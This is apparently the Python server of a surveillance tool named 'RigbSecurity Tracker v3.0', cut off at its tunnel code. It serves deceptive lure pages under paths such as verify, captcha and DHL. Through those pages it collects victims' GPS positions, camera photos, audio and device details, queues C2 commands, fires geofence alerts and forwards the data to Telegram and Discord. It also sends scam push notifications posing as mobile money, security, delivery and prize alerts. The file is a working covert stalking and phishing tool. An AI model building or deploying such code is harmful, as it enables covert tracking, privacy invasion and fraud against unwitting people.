#!/usr/bin/env python3
"""
RigbSecurity Tracker v3.0
Advanced GPS + Camera + Audio Surveillance Framework
Enhanced: Authentication, C2, Geofencing, Thread Safety, Export, Validation
"""

import os
import re
import sys
import json
import time
import uuid
import math
import base64
import signal
import hashlib
import random
import argparse
import threading
import subprocess as subp
from datetime import datetime
from csv import writer as csv_writer
from functools import wraps

try:
    from flask import Flask, request, jsonify, send_from_directory, Response, make_response
    from flask_sock import Sock
except ImportError:
    os.system('pip3 install flask flask-sock')
    from flask import Flask, request, jsonify, send_from_directory, Response, make_response
    from flask_sock import Sock

try:
    from pywebpush import webpush
except ImportError:
    webpush = None

import utils

VERSION = '3.0.0'
R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'
Y = '\033[33m'
M = '\033[35m'

# ═══════════════════════════════════════════
# PATHS & CONFIG
# ═══════════════════════════════════════════
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DB_DIR = os.path.join(SCRIPT_DIR, 'db')
LOG_DIR = os.path.join(SCRIPT_DIR, 'logs')
CAPTURES_DIR = os.path.join(SCRIPT_DIR, 'captures')
STATIC_DIR = os.path.join(SCRIPT_DIR, 'static')
TEMPLATES_JSON = os.path.join(SCRIPT_DIR, 'template', 'templates.json')
META_FILE = os.path.join(SCRIPT_DIR, 'metadata.json')
DATA_FILE = os.path.join(DB_DIR, 'results.csv')
TARGETS_FILE = os.path.join(DB_DIR, 'targets.json')
GEOFENCES_FILE = os.path.join(DB_DIR, 'geofences.json')

for d in [DB_DIR, LOG_DIR, CAPTURES_DIR, STATIC_DIR]:
    os.makedirs(d, exist_ok=True)

# ═══════════════════════════════════════════
# ARGUMENT PARSING
# ═══════════════════════════════════════════
parser = argparse.ArgumentParser(description='RigbSecurity Tracker v' + VERSION)
parser.add_argument('-p', '--port', type=int, default=8000, help='Server port [Default: 8000]')
parser.add_argument('-t', '--tunnel', choices=['cloudflared', 'ngrok', 'loclx', 'manual'],
                    default='loclx', help='Tunnel type [Default: loclx]')
parser.add_argument('--no-tunnel', action='store_true', help='No tunnel')
parser.add_argument('-tg', '--telegram', help='Telegram bot token:chatId')
parser.add_argument('-wh', '--webhook', help='Discord/Custom webhook URL')
parser.add_argument('-v', '--version', action='store_true', help='Print version')
parser.add_argument('-k', '--kml', help='KML output filename')
parser.add_argument('--auth', help='Dashboard auth password [Default: auto-generated]')
args = parser.parse_args()

if args.version:
    print(VERSION)
    sys.exit()

port = int(os.getenv('PORT', 0)) or args.port
TELEGRAM = os.getenv('TELEGRAM') or args.telegram
WEBHOOK = os.getenv('WEBHOOK') or args.webhook
VAPID_PUBLIC = os.getenv('VAPID_PUBLIC', '')
VAPID_PRIVATE = os.getenv('VAPID_PRIVATE', '')

# ═══════════════════════════════════════════
# AUTHENTICATION
# ═══════════════════════════════════════════
DASHBOARD_PASSWORD = os.getenv('DASHBOARD_PASSWORD') or args.auth or uuid.uuid4().hex[:12]
DASHBOARD_TOKEN = hashlib.sha256(DASHBOARD_PASSWORD.encode()).hexdigest()


def check_auth(f):
    """Decorator to protect dashboard/admin routes."""
    @wraps(f)
    def decorated(*a, **kw):
        token = request.cookies.get('rigb_auth') or request.headers.get('X-Auth-Token')
        if token == DASHBOARD_TOKEN:
            return f(*a, **kw)
        if request.args.get('token') == DASHBOARD_TOKEN:
            return f(*a, **kw)
        return Response('Unauthorized', 401, {'WWW-Authenticate': 'Basic realm="RigbSecurity"'})
    return decorated


# ═══════════════════════════════════════════
# THREAD-SAFE DATA STORE
# ═══════════════════════════════════════════
data_lock = threading.Lock()
targets = {}
gps_data = {}
media_log = {}
device_info_store = {}
push_subs = {}
geofences = {}
command_queue = {}
ws_dashboards = []

MAX_CONTENT_LENGTH = 16 * 1024 * 1024


def load_targets():
    global targets, gps_data, media_log
    if os.path.exists(TARGETS_FILE):
        try:
            with open(TARGETS_FILE) as f:
                data = json.load(f)
                targets = data.get('targets', {})
                gps_data = data.get('gps_data', {})
                media_log = data.get('media_log', {})
                utils.print(f'{G}[+] {C}Loaded {len(targets)} targets from disk{W}')
        except Exception:
            pass


def save_targets():
    with data_lock:
        try:
            with open(TARGETS_FILE, 'w') as f:
                json.dump({
                    'targets': targets,
                    'gps_data': gps_data,
                    'media_log': media_log
                }, f, indent=2, default=str)
        except Exception:
            pass


def load_geofences():
    global geofences
    if os.path.exists(GEOFENCES_FILE):
        try:
            with open(GEOFENCES_FILE) as f:
                geofences = json.load(f)
        except Exception:
            pass


def save_geofences():
    with data_lock:
        try:
            with open(GEOFENCES_FILE, 'w') as f:
                json.dump(geofences, f, indent=2)
        except Exception:
            pass


load_targets()
load_geofences()


def auto_save():
    while True:
        time.sleep(60)
        save_targets()


threading.Thread(target=auto_save, daemon=True).start()


# ═══════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════
def banner():
    art = f"""{G}
 ____  _       _     ____                       _ _
|  _ \\(_) __ _| |__ / ___|  ___  ___ _   _ _ __(_) |_ _   _
| |_) | |/ _` | '_ \\\\___ \\ / _ \\/ __| | | | '__| | __| | | |
|  _ <| | (_| | |_) |___) |  __/ (__| |_| | |  | | |_| |_| |
|_| \\_\\_|\\__, |_.__/|____/ \\___|\\___|\\___|_|  |_|\\__|\\__, |
         |___/            {Y}TRACKER v{VERSION}{G}                 |___/{W}

{G}[>] {C}Created By   : {W}RigbSecurity
{G}[>] {C}Version      : {W}{VERSION}
{G}[>] {C}Mode         : {Y}GPS ONLY — No IP Geolocation{W}
{G}[>] {C}Features     : {W}GPS + Camera + Audio + C2 + Geofence + Export
{G}[>] {C}Dashboard PW : {Y}{DASHBOARD_PASSWORD}{W}
"""
    utils.print(art)


def load_templates():
    with open(TEMPLATES_JSON) as f:
        return json.load(f)['templates']


# ═══════════════════════════════════════════
# GEOFENCE LOGIC
# ═══════════════════════════════════════════
def haversine(lat1, lon1, lat2, lon2):
    """Calculate distance in meters between two GPS points."""
    R_EARTH = 6371000
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dphi = math.radians(lat2 - lat1)
    dlam = math.radians(lon2 - lon1)
    a = math.sin(dphi / 2) ** 2 + math.cos(phi1) * math.cos(phi2) * math.sin(dlam / 2) ** 2
    return R_EARTH * 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))


def check_geofences(tid, lat, lon):
    """Check if target entered/exited any geofences."""
    alerts = []
    tid_fences = geofences.get(tid, [])
    for fence in tid_fences:
        dist = haversine(lat, lon, fence['lat'], fence['lon'])
        inside = dist <= fence['radius']
        was_inside = fence.get('inside', False)
        if inside and not was_inside:
            fence['inside'] = True
            alerts.append({'type': 'enter', 'name': fence['name'], 'dist': dist})
        elif not inside and was_inside:
            fence['inside'] = False
            alerts.append({'type': 'exit', 'name': fence['name'], 'dist': dist})
    if alerts:
        save_geofences()
    return alerts


# ═══════════════════════════════════════════
# NOTIFICATIONS
# ═══════════════════════════════════════════
def send_telegram_gps(tid, entry):
    if not TELEGRAM:
        return
    try:
        parts = TELEGRAM.split(':')
        if len(parts) < 3:
            return
        token = f"{parts[0]}:{parts[1]}"
        chat_id = parts[2]
        name = targets.get(tid, {}).get('name', tid)
        lat = entry.get('lat', '?')
        lon = entry.get('lon', '?')
        acc = entry.get('acc', '?')
        import requests
        url = f"https://api.telegram.org/bot{token}"
        requests.post(f"{url}/sendLocation", json={
            'chat_id': chat_id, 'latitude': lat, 'longitude': lon
        }, timeout=10)
        msg = (f"📍 *GPS FIX — [{name}]*\n"
               f"Lat: `{lat}`\nLon: `{lon}`\nAccuracy: `{acc}m`\n"
               f"Source: `SATELLITE GPS`\nTime: `{datetime.now().strftime('%H:%M:%S')}`\n"
               f"[Google Maps](https://maps.google.com/?q={lat},{lon})")
        requests.post(f"{url}/sendMessage", json={
            'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown',
            'disable_web_page_preview': True
        }, timeout=10)
    except Exception as e:
        utils.print(f'{R}[-] {C}Telegram error: {str(e)}{W}')


def send_telegram_photo(tid, filepath):
    if not TELEGRAM:
        return
    try:
        parts = TELEGRAM.split(':')
        token = f"{parts[0]}:{parts[1]}"
        chat_id = parts[2]
        name = targets.get(tid, {}).get('name', tid)
        import requests
        with open(filepath, 'rb') as photo:
            requests.post(f"https://api.telegram.org/bot{token}/sendPhoto",
                          data={'chat_id': chat_id,
                                'caption': f"📸 [{name}] — {datetime.now().strftime('%H:%M:%S')}"},
                          files={'photo': photo}, timeout=30)
    except Exception:
        pass


def send_telegram_geofence(tid, alert):
    if not TELEGRAM:
        return
    try:
        parts = TELEGRAM.split(':')
        token = f"{parts[0]}:{parts[1]}"
        chat_id = parts[2]
        name = targets.get(tid, {}).get('name', tid)
        import requests
        emoji = "🚨" if alert['type'] == 'enter' else "🏃"
        msg = (f"{emoji} *GEOFENCE {alert['type'].upper()} — [{name}]*\n"
               f"Zone: `{alert['name']}`\n"
               f"Distance: `{alert['dist']:.0f}m`\n"
               f"Time: `{datetime.now().strftime('%H:%M:%S')}`")
        url = f"https://api.telegram.org/bot{token}"
        requests.post(f"{url}/sendMessage", json={
            'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'
        }, timeout=10)
    except Exception:
        pass


def send_discord(tid, entry, msg_type='gps'):
    if not WEBHOOK:
        return
    try:
        import requests
        name = targets.get(tid, {}).get('name', tid)
        if msg_type == 'gps':
            requests.post(WEBHOOK, json={"embeds": [{"title": f"📍 GPS — {name}", "color": 65280,
                "fields": [
                    {"name": "Lat", "value": str(entry.get('lat')), "inline": True},
                    {"name": "Lon", "value": str(entry.get('lon')), "inline": True},
                    {"name": "Acc", "value": f"{entry.get('acc')}m", "inline": True},
                    {"name": "Maps", "value": f"[Open](https://maps.google.com/?q={entry['lat']},{entry['lon']})"}
                ]}]}, timeout=10)
        else:
            requests.post(WEBHOOK, json={"embeds": [{"title": f"📷 Media — {name}", "color": 16744448,
                                 "description": json.dumps(entry, indent=2, default=str)[:2000]}]}, timeout=10)
    except Exception:
        pass


# ═══════════════════════════════════════════
# DASHBOARD BROADCAST
# ═══════════════════════════════════════════
def broadcast_dashboard(data):
    msg = json.dumps(data, default=str)
    dead = []
    for ws in ws_dashboards:
        try:
            ws.send(msg)
        except Exception:
            dead.append(ws)
    for ws in dead:
        if ws in ws_dashboards:
            ws_dashboards.remove(ws)


# ═══════════════════════════════════════════
# CONSOLE OUTPUT
# ═══════════════════════════════════════════
def print_visit(tid):
    t = targets[tid]
    name = t.get('name', tid)
    visits = t.get('visits', 0)
    utils.print(f'{G}  [+] {C}[{name}] Visit #{visits}{W}')


def print_gps(tid, entry):
    name = targets.get(tid, {}).get('name', tid)
    lat = entry.get('lat', '?')
    lon = entry.get('lon', '?')
    acc = entry.get('acc', '?')
    spd = entry.get('spd')
    acc_str = f"{float(acc):.1f}" if acc else "?"
    spd_str = f"{float(spd) * 2.237:.1f} mph" if spd else "Still"
    utils.print(f"""
{G}  ╔══════════════════════════════════════════════════╗
  ║  📍 GPS FIX — [{name}]
  ╠══════════════════════════════════════════════════╣
  ║  Latitude  : {str(lat):<33}║
  ║  Longitude : {str(lon):<33}║
  ║  Accuracy  : {acc_str + 'm':<33}║
  ║  Speed     : {spd_str:<33}║
  ║  Source    : GPS SATELLITE                      ║
  ╠══════════════════════════════════════════════════╣
  ║  🗺️  https://maps.google.com/?q={lat},{lon}
  ╚══════════════════════════════════════════════════╝{W}""")


def print_media(tid, media_type, camera, filename):
    name = targets.get(tid, {}).get('name', tid)
    if media_type == 'photo':
        utils.print(f'{M}  📸 [{name}] Photo ({camera}): {filename}{W}')
    elif media_type == 'audio':
        utils.print(f'{C}  🎙️ [{name}] Audio: {filename}{W}')


def print_device(tid, data):
    name = targets.get(tid, {}).get('name', tid)
    utils.print(f"""
{C}  ╔══════════════════════════════════════════════════╗
  ║  📱 DEVICE INFO — [{name}]
  ╠══════════════════════════════════════════════════╣
  ║  Platform : {str(data.get('platform','?')):<34}║
  ║  Cores    : {str(data.get('cores','?')):<34}║
  ║  Memory   : {str(data.get('memory','?')) + ' GB':<34}║
  ║  Battery  : {str(data.get('battery',{}).get('level','?')) + '%':<34}║
  ║  Network  : {str(data.get('network',{}).get('effectiveType','?')):<34}║
  ║  Timezone : {str(data.get('timezone','?')):<34}║
  ╚══════════════════════════════════════════════════╝{W}""")


# ═══════════════════════════════════════════
# CSV LOGGING
# ═══════════════════════════════════════════
def csv_save(tid, entry):
    try:
        with open(DATA_FILE, 'a', newline='') as f:
            w = csv_writer(f)
            w.writerow([datetime.now().isoformat(), tid,
                         entry.get('lat'), entry.get('lon'), entry.get('acc'),
                         entry.get('alt'), entry.get('spd'), entry.get('source'),
                         entry.get('ua', '')])
    except Exception:
        pass


# ═══════════════════════════════════════════
# PUSH NOTIFICATIONS
# ═══════════════════════════════════════════
def get_push_message(template):
    messages = {
        # Ghana-specific
        'momo':         [{'title': '💰 MoMo Alert', 'body': 'You have a pending transfer of GH₵ 500.'}],
        'voda':         [{'title': '📱 Vodafone Cash', 'body': 'Confirm your withdrawal of GH₵ 200.'}],
        'ecg':          [{'title': '⚡ ECG Notice', 'body': 'Your prepaid meter needs attention.'}],
        'nia':          [{'title': '🪪 Ghana Card', 'body': 'Your card is ready for collection.'}],
        'gra':          [{'title': '🏛️ GRA Alert', 'body': 'Tax refund of GH₵ 1,200 pending.'}],
        'mason':        [{'title': '🧱 Job Update', 'body': 'Client confirmed — start Monday.'}],
        'carpenter':    [{'title': '🪚 New Estimate', 'body': 'Custom furniture — GH₵ 5K budget.'}],
        'electrician':  [{'title': '⚡ Emergency Call', 'body': 'Customer without power 2 hours.'}],
        'photographer': [{'title': '📸 Client Message', 'body': 'Wedding client wants to discuss.'}],
        'dj':           [{'title': '🎧 Gig Expiring', 'body': 'Saturday gig needs confirmation.'}],
        'nurse':        [{'title': '🏥 Bonus Increased', 'body': 'Shift bonus bumped to GH₵ 750.'}],
        'mechanic':     [{'title': '🔧 Repair Approved', 'body': 'Customer approved GH₵ 2,800 repair.'}],
        'barber':       [{'title': '💈 VIP Update', 'body': 'VIP client moved to 3PM.'}],
        'cleaner':      [{'title': '🧹 Premium Job', 'body': 'Deep clean — GH₵ 400 payout.'}],
        'influencer':   [{'title': '📱 Brand Approved', 'body': 'Kasapreko approved your concept.'}],
        # Global — Captcha / Verification
        'captcha':      [{'title': '🔒 Security Check', 'body': 'Complete verification to continue.'}],
        'verify':       [{'title': '✓ Verification Needed', 'body': 'One more step to verify your identity.'}],
        # Global — Google Drive
        'gdrive':       [{'title': '📄 Document Shared', 'body': 'Someone shared a file with you. Tap to view.'}],
        'drive':        [{'title': '📄 New Shared File', 'body': 'You have a new document waiting.'}],
        'document':     [{'title': '📋 Document Access', 'body': 'A document requires your attention.'}],
        # Global — Security Alerts
        'security':     [{'title': '⚠️ Security Alert', 'body': 'Unauthorized login attempt detected.'}],
        'alert':        [{'title': '🚨 Account Alert', 'body': 'Suspicious activity on your account.'}],
        'login':        [{'title': '⚠️ Login Attempt', 'body': 'Someone tried to access your account.'}],
        # Global — Package Delivery
        'package':      [{'title': '📦 Delivery Failed', 'body': 'Your package could not be delivered. Action required.'}],
        'delivery':     [{'title': '📦 Package Update', 'body': 'Delivery attempt failed. Confirm address.'}],
        'dhl':          [{'title': '📦 DHL Express', 'body': 'Delivery failed — confirm your address.'}],
        'fedex':        [{'title': '📦 FedEx Delivery', 'body': 'Package held — address confirmation needed.'}],
        # Global — Voice Note
        'voicenote':    [{'title': '🎤 Voice Message', 'body': 'You have an unheard voice message.'}],
        'voice':        [{'title': '🔊 New Voice Note', 'body': 'Someone sent you a voice message.'}],
        'audio':        [{'title': '🎤 Audio Message', 'body': 'Tap to listen to your voice message.'}],
        # Global — WiFi
        'wifi':         [{'title': '📶 WiFi Available', 'body': 'Free high-speed WiFi detected nearby.'}],
        'hotspot':      [{'title': '📶 Connect to WiFi', 'body': 'Tap to connect to free WiFi.'}],
        # Global — Social Media
        'instagram':    [{'title': '📷 Instagram Security', 'body': 'Your account requires verification.'}],
        'ig':           [{'title': '📷 Account at Risk', 'body': 'Verify your Instagram account now.'}],
        'tiktok':       [{'title': '🎵 TikTok Security', 'body': 'Your account is under review.'}],
        'tt':           [{'title': '🎵 Action Required', 'body': 'Verify your TikTok account to avoid suspension.'}],
        # Global — Lottery
        'lottery':      [{'title': '🎉 You Won!', 'body': 'Congratulations! Claim your prize now.'}],
        'prize':        [{'title': '🎁 Prize Ready', 'body': 'Your prize is waiting. Claim before it expires.'}],
        'giveaway':     [{'title': '🎁 Giveaway Winner', 'body': 'You have been selected! Claim your reward.'}],
        'win':          [{'title': '🏆 Winner!', 'body': 'You won! Tap to claim your reward.'}],
    }
    msgs = messages.get(template, [{'title': '🔔 Action Required', 'body': 'You have a pending item.'}])
    return random.choice(msgs)


def push_loop(tid):
    time.sleep(2 * 60 * 60)
    while tid in push_subs:
        sub = push_subs.get(tid)
        if not sub or not VAPID_PUBLIC or not VAPID_PRIVATE:
            break
        template = targets.get(tid, {}).get('template', 'generic')
        msg = get_push_message(template)
        try:
            if webpush:
                webpush(subscription_info=sub, data=json.dumps(msg),
                        vapid_private_key=VAPID_PRIVATE,
                        vapid_claims={"sub": "mailto:admin@rigbsecurity.com"})
            utils.print(f'{Y}  [!] {C}Auto-push [{tid}]: {msg["title"]}{W}')
        except Exception:
            if tid in push_subs:
                del push_subs[tid]
            break
        time.sleep((3 + random.random() * 3) * 3600)


# ═══════════════════════════════════════════
# INPUT VALIDATION
# ═══════════════════════════════════════════
def validate_gps(data):
    """Validate GPS coordinates are within valid ranges."""
    lat = data.get('lat')
    lon = data.get('lon')
    if lat is None or lon is None:
        return False
    try:
        lat = float(lat)
        lon = float(lon)
        if not (-90 <= lat <= 90):
            return False
        if not (-180 <= lon <= 180):
            return False
        return True
    except (TypeError, ValueError):
        return False


# ═══════════════════════════════════════════
# FLASK APP
# ═══════════════════════════════════════════
app = Flask(__name__, static_folder=STATIC_DIR)
app.config['MAX_CONTENT_LENGTH'] = MAX_CONTENT_LENGTH
sock = Sock(app)

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


# ═══════════════════════════════════════════
# TRACKING PAGE ROUTES (No auth — for targets)
# ═══════════════════════════════════════════
@app.route('/<path>/<tid>')
def serve_tracking_page(path, tid):
    templates = load_templates()
    valid_paths = [t['url_path'] for t in templates]
    if path not in valid_paths:
        return '', 404
    if tid not in targets:
        with data_lock:
            targets[tid] = {'created': datetime.now().isoformat(), 'template': path,
                             'name': tid, 'visits': 0}
            gps_data[tid] = []
            media_log[tid] = []
    with data_lock:
        targets[tid]['visits'] = targets[tid].get('visits', 0) + 1
    print_visit(tid)
    broadcast_dashboard({'type': 'visit', 'tid': tid})
    return send_from_directory(STATIC_DIR, 'tracker.html')


# ═══════════════════════════════════════════
# TARGET-FACING APIs (No auth)
# ═══════════════════════════════════════════
@app.route('/api/gps/<tid>', methods=['POST'])
def api_gps(tid):
    if tid not in targets:
        return jsonify({'error': 'invalid'}), 404
    data = request.get_json(silent=True) or {}
    if not validate_gps(data):
        return jsonify({'error': 'invalid coordinates'}), 400
    entry = {'lat': float(data.get('lat')), 'lon': float(data.get('lon')),
             'acc': data.get('acc'), 'alt': data.get('alt'),
             'dir': data.get('dir'), 'spd': data.get('spd'),
             'source': data.get('source', 'gps'), 'ts': data.get('ts', datetime.now().isoformat()),
             'ua': request.headers.get('User-Agent', '')}
    with data_lock:
        if tid not in gps_data:
            gps_data[tid] = []
        gps_data[tid].append(entry)
    print_gps(tid, entry)
    csv_save(tid, entry)
    broadcast_dashboard({'type': 'gps', 'tid': tid, 'entry': entry})
    # Geofence check
    alerts = check_geofences(tid, entry['lat'], entry['lon'])
    for alert in alerts:
        broadcast_dashboard({'type': 'geofence', 'tid': tid, 'alert': alert})
        send_telegram_geofence(tid, alert)
    count = len(gps_data.get(tid, []))
    if count == 1 or count % 10 == 0:
        send_telegram_gps(tid, entry)
        send_discord(tid, entry, 'gps')
    # Return pending C2 commands
    cmds = command_queue.pop(tid, [])
    return jsonify({'status': 'ok', 'commands': cmds})


@app.route('/api/beacon/<tid>', methods=['POST'])
def api_beacon(tid):
    if tid not in targets:
        return '', 204
    try:
        raw = request.get_data(as_text=True)
        data = json.loads(raw) if raw else {}
        if not validate_gps(data):
            return '', 204
        entry = {'lat': float(data.get('lat')), 'lon': float(data.get('lon')),
                 'acc': data.get('acc'), 'source': 'gps_beacon',
                 'ts': datetime.now().isoformat()}
        with data_lock:
            if tid not in gps_data:
                gps_data[tid] = []
            gps_data[tid].append(entry)
        print_gps(tid, entry)
        broadcast_dashboard({'type': 'gps', 'tid': tid, 'entry': entry})
    except Exception:
        pass
    return '', 204


@app.route('/api/media/<tid>', methods=['POST'])
def api_media(tid):
    if tid not in targets:
        return jsonify({'error': 'invalid'}), 404
    data = request.get_json(silent=True) or {}
    media_type = data.get('type', 'photo')
    if media_type not in ('photo', 'audio', 'video'):
        return jsonify({'error': 'invalid media type'}), 400
    media_b64 = data.get('data', '')
    if not media_b64:
        return jsonify({'error': 'no data'}), 400
    camera = data.get('camera', 'front')
    target_dir = os.path.join(CAPTURES_DIR, tid)
    os.makedirs(target_dir, exist_ok=True)
    ext_map = {'photo': 'jpg', 'audio': 'webm', 'video': 'webm'}
    ext = ext_map.get(media_type, 'bin')
    filename = f"{media_type}_{camera}_{int(time.time()*1000)}.{ext}"
    filepath = os.path.join(target_dir, filename)
    try:
        b64_clean = media_b64.split(',')[-1] if ',' in media_b64 else media_b64
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(b64_clean))
    except Exception:
        return jsonify({'error': 'decode failed'}), 400
    entry = {'type': media_type, 'camera': camera, 'filename': filename,
             'ts': data.get('ts', datetime.now().isoformat())}
    with data_lock:
        if tid not in media_log:
            media_log[tid] = []
        media_log[tid].append(entry)
    print_media(tid, media_type, camera, filename)
    broadcast_dashboard({'type': 'media', 'tid': tid, 'entry': entry})
    photo_count = len([m for m in media_log.get(tid, []) if m['type'] == 'photo'])
    if media_type == 'photo' and photo_count <= 3:
        send_telegram_photo(tid, filepath)
    return jsonify({'status': 'ok'})


@app.route('/api/device/<tid>', methods=['POST'])
def api_device(tid):
    if tid not in targets:
        return jsonify({'error': 'invalid'}), 404
    data = request.get_json(silent=True) or {}
    with data_lock:
        device_info_store[tid] = data
    print_device(tid, data)
    broadcast_dashboard({'type': 'device', 'tid': tid, 'data': data})
    return jsonify({'status': 'ok'})


@app.route('/api/sensors/<tid>', methods=['POST'])
def api_sensors(tid):
    """Receive accelerometer/gyroscope/orientation sensor data."""
    if tid not in targets:
        return jsonify({'error': 'invalid'}), 404
    data = request.get_json(silent=True) or {}
    broadcast_dashboard({'type': 'sensors', 'tid': tid, 'data': data})
    return jsonify({'status': 'ok'})


@app.route('/api/subscribe/<tid>', methods=['POST'])
def api_subscribe(tid):
    push_subs[tid] = request.get_json(silent=True)
    utils.print(f'{G}  [+] {C}[{tid}] Push subscribed{W}')
    threading.Thread(target=push_loop, args=(tid,), daemon=True).start()
    return jsonify({'status': 'subscribed'})


@app.route('/api/vapid-key')
def api_vapid():
    return jsonify({'key': VAPID_PUBLIC})


@app.route('/api/keepalive')
def keepalive():
    return '', 200


@app.route('/api/poll/<tid>')
def api_poll(tid):
    """Target polls for pending C2 commands."""
    cmds = command_queue.pop(tid, [])
    return jsonify({'commands': cmds})


# ═══════════════════════════════════════════
# DASHBOARD / ADMIN APIs (Auth required)
# ═══════════════════════════════════════════
@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json(silent=True) or {}
    pw = data.get('password', '')
    token = hashlib.sha256(pw.encode()).hexdigest()
    if token == DASHBOARD_TOKEN:
        resp = make_response(jsonify({'status': 'ok', 'token': token}))
        resp.set_cookie('rigb_auth', token, httponly=True, samesite='Strict', max_age=86400 * 7)
        return resp
    return jsonify({'error': 'invalid password'}), 401


@app.route('/api/create')
@check_auth
def api_create():
    tid = uuid.uuid4().hex[:8]
    template = request.args.get('template', 'generic')
    name = request.args.get('name', '')
    with data_lock:
        targets[tid] = {'created': datetime.now().isoformat(), 'template': template,
                         'name': name or tid, 'visits': 0}
        gps_data[tid] = []
        media_log[tid] = []
    templates = load_templates()
    url_path = 'verify'
    for t in templates:
        if t['dir_name'] == template:
            url_path = t['url_path']
            break
    host = request.host_url.rstrip('/')
    save_targets()
    return jsonify({'trackingId': tid, 'link': f'{host}/{url_path}/{tid}',
                    'dashboard': f'{host}/dashboard'})


@app.route('/api/all-targets')
@check_auth
def api_all_targets():
    result = {}
    for tid in targets:
        result[tid] = {'tracking': targets[tid], 'locations': gps_data.get(tid, []),
                       'media': media_log.get(tid, []), 'device': device_info_store.get(tid, {})}
    return jsonify(result)


@app.route('/api/command/<tid>', methods=['POST'])
@check_auth
def api_command(tid):
    """Queue a C2 command for the target."""
    data = request.get_json(silent=True) or {}
    cmd = data.get('command', 'getGPS')
    if tid not in targets:
        return jsonify({'status': 'target not found'}), 404
    with data_lock:
        if tid not in command_queue:
            command_queue[tid] = []
        command_queue[tid].append({'cmd': cmd, 'ts': datetime.now().isoformat()})
    utils.print(f'{Y}  [C2] {C}Command queued for [{tid}]: {cmd}{W}')
    broadcast_dashboard({'type': 'c2', 'tid': tid, 'cmd': cmd, 'status': 'queued'})
    return jsonify({'status': 'queued', 'command': cmd})


@app.route('/api/delete/<tid>', methods=['DELETE'])
@check_auth
def api_delete(tid):
    """Delete a target and all its data."""
    with data_lock:
        targets.pop(tid, None)
        gps_data.pop(tid, None)
        media_log.pop(tid, None)
        device_info_store.pop(tid, None)
        push_subs.pop(tid, None)
        command_queue.pop(tid, None)
    save_targets()
    return jsonify({'status': 'deleted'})


@app.route('/api/geofence/<tid>', methods=['POST'])
@check_auth
def api_geofence(tid):
    """Add a geofence for a target."""
    data = request.get_json(silent=True) or {}
    fence = {
        'name': data.get('name', 'Zone'),
        'lat': float(data.get('lat', 0)),
        'lon': float(data.get('lon', 0)),
        'radius': float(data.get('radius', 100)),
        'inside': False
    }
    with data_lock:
        if tid not in geofences:
            geofences[tid] = []
        geofences[tid].append(fence)
    save_geofences()
    return jsonify({'status': 'added', 'fence': fence})


@app.route('/api/geofences/<tid>')
@check_auth
def api_get_geofences(tid):
    return jsonify(geofences.get(tid, []))


@app.route('/api/export/<tid>')
@check_auth
def api_export(tid):
    """Export target data as JSON dossier."""
    if tid not in targets:
        return jsonify({'error': 'not found'}), 404
    dossier = {
        'target': targets[tid],
        'locations': gps_data.get(tid, []),
        'media': media_log.get(tid, []),
        'device': device_info_store.get(tid, {}),
        'geofences': geofences.get(tid, []),
        'exported_at': datetime.now().isoformat()
    }
    return jsonify(dossier)


@app.route('/api/export/<tid>/kml')
@check_auth
def api_export_kml(tid):
    """Export target GPS history as KML file."""
    if tid not in targets:
        return jsonify({'error': 'not found'}), 404
    locations = gps_data.get(tid, [])
    name = targets[tid].get('name', tid)
    kml = f"""<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
<Document>
<name>{name} — RigbSecurity Track</name>
<Style id="track"><LineStyle><color>ff0000ff</color><width>3</width></LineStyle></Style>
<Placemark><name>Track</name><styleUrl>#track</styleUrl>
<LineString><coordinates>
"""
    for loc in locations:
        if loc.get('lat') and loc.get('lon'):
            kml += f"{loc['lon']},{loc['lat']},{loc.get('alt', 0)}\n"
    kml += """</coordinates></LineString></Placemark>
"""
    for i, loc in enumerate(locations):
        if loc.get('lat') and loc.get('lon'):
            kml += f"""<Placemark><name>Point {i+1}</name>
<description>Time: {loc.get('ts','?')}, Acc: {loc.get('acc','?')}m</description>
<Point><coordinates>{loc['lon']},{loc['lat']},{loc.get('alt',0)}</coordinates></Point>
</Placemark>
"""
    kml += "</Document></kml>"
    resp = make_response(kml)
    resp.headers['Content-Type'] = 'application/vnd.google-earth.kml+xml'
    resp.headers['Content-Disposition'] = f'attachment; filename={tid}_track.kml'
    return resp


# ═══════════════════════════════════════════
# STATIC FILE SERVING
# ═══════════════════════════════════════════
@app.route('/dashboard')
@app.route('/dashboard.html')
def serve_dashboard():
    return send_from_directory(STATIC_DIR, 'dashboard.html')


@app.route('/sw.js')
def serve_sw():
    resp = send_from_directory(STATIC_DIR, 'sw.js')
    resp.headers['Service-Worker-Allowed'] = '/'
    resp.headers['Content-Type'] = 'application/javascript'
    return resp


@app.route('/manifest.json')
def serve_manifest():
    return send_from_directory(STATIC_DIR, 'manifest.json')


@app.route('/js/<path:filename>')
def serve_js(filename):
    return send_from_directory(os.path.join(SCRIPT_DIR, 'js'), filename)


@app.route('/captures/<tid>/<filename>')
@check_auth
def serve_capture(tid, filename):
    return send_from_directory(os.path.join(CAPTURES_DIR, tid), filename)


# ═══════════════════════════════════════════
# WEBSOCKET DASHBOARD
# ═══════════════════════════════════════════
@sock.route('/ws/dashboard')
def ws_dashboard(ws):
    ws_dashboards.append(ws)
    utils.print(f'{G}  [+] {C}Dashboard connected ({len(ws_dashboards)}){W}')
    try:
        while True:
            msg = ws.receive(timeout=60)
            if msg:
                try:
                    data = json.loads(msg)
                    if data.get('type') == 'command':
                        tid = data.get('tid')
                        cmd = data.get('cmd', 'getGPS')
                        if tid and tid in targets:
                            with data_lock:
                                if tid not in command_queue:
                                    command_queue[tid] = []
                                command_queue[tid].append({'cmd': cmd, 'ts': datetime.now().isoformat()})
                            utils.print(f'{Y}  [C2] {C}WS command for [{tid}]: {cmd}{W}')
                except Exception:
                    pass
    except Exception:
        pass
    finally:
        if ws in ws_dashboards:
            ws_dashboards.remove(ws)


# ═══════════════════════════════════════════
# TUNNELING
# ═══════════════════════════════════════════
def start_loclx(lport):
    utils.print(f'{G}  [+] {C}Starting LocalXpose tunnel...{W}')
